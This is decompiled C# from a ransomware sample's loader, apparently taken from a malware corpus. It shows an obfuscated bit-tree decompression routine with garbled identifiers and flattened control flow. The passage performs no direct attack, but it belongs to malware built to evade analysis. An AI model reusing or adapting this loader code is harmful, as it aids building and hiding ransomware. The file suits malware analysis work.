// Decompiled with JetBrains decompiler
// Type: Ⴍ.ႷႭ
// Assembly: jizbwcwvchLoader, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B60D9367-1A45-4565-96B0-53F2CD92A512
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00060-msil\Trojan-Ransom.Win32.Blocker.bdzb-39b748d8a4dd59a65e8a25c296dfc3aa1df8ddf8.exe

using System;
using System.Runtime.InteropServices;

namespace Ⴍ
{
  internal struct ႷႭ
  {
    private ႷႣ.ႠႭ Ⴅ;

    public ႷႭ([In] int obj0)
    {
      this.Ⴅ.Ⴃ = obj0;
      this.Ⴅ.Ⴍ = new ႷႥ[1 << obj0];
      ႷႣ.ႷႠ();
    }

    public void Ⴄ()
    {
      byte[] ⴍ = \u0003\u2002.Ⴍ;
      int num = 3;
      uint index;
      while (true)
      {
        switch (num)
        {
          case 0:
            num = (long) index < (long) (1 << this.Ⴅ.Ⴃ) ? (int) ⴍ[265] - 60 : 1;
            continue;
          case 1:
            goto label_6;
          case 2:
          case 4:
            this.Ⴅ.Ⴍ[(IntPtr) index].Ⴃ();
            goto case 6;
          case 5:
            goto label_7;
          case 6:
            ++index;
            num = 0;
            continue;
          default:
            index = 1U;
            num = 0;
            continue;
        }
      }
label_6:
      return;
label_7:;
    }

    public uint Ⴄ([In] ႷႣ obj0)
    {
      byte[] ⴍ = \u0003\u2002.Ⴍ;
label_3:
      uint index = 1;
label_4:
      int ⴃ = this.Ⴅ.Ⴃ;
label_5:
      int num = (int) ⴍ[7];
      while (true)
      {
        switch (num)
        {
          case 0:
            index = (index << 1) + this.Ⴅ.Ⴍ[(IntPtr) index].Ⴐ(obj0);
            num = 8;
            continue;
          case 1:
            num = ⴃ > 0 ? (int) ⴍ[110] - 254 : (int) ⴍ[62] - (int) ⴍ[19];
            continue;
          case 2:
            goto label_9;
          case 3:
            goto label_5;
          case 4:
            goto label_3;
          case 5:
            goto label_4;
          case 8:
            --ⴃ;
            num = 1;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႭ.Ⴄ);
            num = 4;
            continue;
        }
      }
label_9:
      return index - (uint) (1 << this.Ⴅ.Ⴃ);
    }

    public uint Ⴀ([In] ႷႣ obj0)
    {
      byte[] ⴍ = \u0003\u2002.Ⴍ;
label_3:
      uint index = 1;
      uint num1 = 0;
      int num2 = 0;
      int num3 = 1;
      uint num4;
      while (true)
      {
        switch (num3)
        {
          case 0:
            num4 = this.Ⴅ.Ⴍ[(IntPtr) index].Ⴐ(obj0);
            num3 = 8;
            continue;
          case 1:
            num3 = num2 < this.Ⴅ.Ⴃ ? 0 : 5;
            continue;
          case 2:
            num3 = 9;
            continue;
          case 5:
            goto label_9;
          case 6:
          case 7:
            goto label_3;
          case 8:
            index = (index << 1) + num4;
            num1 |= num4 << num2;
            goto case 2;
          case 9:
            ++num2;
            num3 = (int) ⴍ[7];
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႭ.Ⴀ);
            num3 = (int) ⴍ[433] / 3;
            continue;
        }
      }
label_9:
      return num1;
    }

    public static uint Ⴍ([In] ႷႥ[] obj0, [In] uint obj1, [In] ႷႣ obj2, [In] int obj3)
    {
      byte[] ⴍ = \u0003\u2002.Ⴍ;
label_3:
      uint num1 = 1;
      uint num2 = 0;
      int num3 = 0;
      int num4 = 2;
      uint num5;
      while (true)
      {
        switch (num4)
        {
          case 0:
          case 9:
            goto label_9;
          case 1:
          case 6:
            num1 += num5;
            num2 |= num5 << num3;
            goto case 4;
          case 2:
            num4 = num3 < obj3 ? 7 : 0;
            continue;
          case 3:
            goto label_3;
          case 4:
            num4 = 8;
            continue;
          case 7:
            num5 = obj0[(IntPtr) (obj1 + num1)].Ⴐ(obj2);
            num1 <<= 1;
            num4 = 6;
            continue;
          case 8:
            ++num3;
            num4 = 2;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႭ.Ⴍ);
            num4 = (int) ⴍ[384] - (int) ⴍ[70];
            continue;
        }
      }
label_9:
      int num6 = (int) num2;
      int num7 = (int) \u0003.Ⴓ();
      return (uint) num6;
    }

    static ႷႭ() => \u0006.Ⴀ();
  }
}
